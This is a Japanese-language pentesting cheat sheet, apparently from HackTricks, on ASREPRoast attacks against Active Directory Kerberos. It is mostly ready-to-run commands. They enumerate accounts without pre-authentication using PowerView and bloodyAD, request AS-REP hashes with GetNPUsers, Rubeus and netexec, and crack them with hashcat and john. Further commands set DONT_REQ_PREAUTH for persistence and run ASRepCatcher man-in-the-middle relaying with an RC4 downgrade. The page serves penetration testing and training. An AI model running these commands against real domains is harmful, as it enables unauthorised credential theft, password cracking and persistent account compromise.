# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoastは、**Kerberos pre-authentication required attribute** を持たないユーザーを悪用するセキュリティ攻撃です。基本的に、この脆弱性により攻撃者はユーザーのパスワードを必要とせずにDomain Controller (DC) に対してそのユーザーの認証を要求できます。DCは次に、ユーザーのパスワードから派生した鍵で暗号化されたメッセージを返し、攻撃者はそのメッセージをオフラインで解析してパスワードを解読しようと試みることができます。

この攻撃の主な要件は次のとおりです:

- **Kerberos pre-authentication の欠如**: 対象ユーザーはこのセキュリティ機能が有効になっていない必要があります。
- **Domain Controller (DC) への接続**: 攻撃者はリクエストを送信し暗号化されたメッセージを受信するためにDCへのアクセスが必要です。
- **オプションのドメインアカウント**: ドメインアカウントがあれば、LDAPクエリを通じて脆弱なユーザーをより効率的に特定できます。そうしたアカウントがない場合、攻撃者はユーザー名を推測する必要があります。

#### Enumerating vulnerable users (need domain credentials)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP メッセージを要求
```bash:Using Linux
#Try all the usernames in usernames.txt
python GetNPUsers.py jurassic.park/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
#Use domain creds to extract targets and target them
python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> AS-REP Roasting with Rubeus は 0x17 の encryption type と 0 の preauth type を持つ 4768 を生成します。

#### クイックワンライナー (Linux)

- 最初に潜在的なターゲットを列挙します（例: leaked build paths から）Kerberos userenum を使用: `kerbrute userenum users.txt -d domain --dc dc.domain`
- 単一ユーザーの AS-REP を、パスワードが **空** の場合でも取得できます: `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast`（netexec は LDAP の signing/channel binding posture も表示します）。
- `hashcat out.asreproast /path/rockyou.txt` でクラックします – AS-REP roast ハッシュに対して **-m 18200** (etype 23) を自動検出します。

### Cracking
```bash
john --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
```
### Persistence

**GenericAll** 権限（またはプロパティを書き込む権限）を持つユーザーに対して、**preauth** を不要に強制的に設定する:
```bash:Using Windows
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
```
## ASREProast without credentials

攻撃者はman-in-the-middleのポジションを利用して、ネットワークを横断するAS-REP packetsを、Kerberos pre-authenticationが無効になっていることに頼らずにキャプチャできます。したがって、VLAN上のすべてのユーザーに対して機能します。\
[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)によりこれが可能です。さらに、このツールはKerberos negotiationを改変してクライアントワークステーションにRC4を使用させます。
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen
```
## 参考文献

- [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)

---

{{#include ../../banners/hacktricks-training.md}}
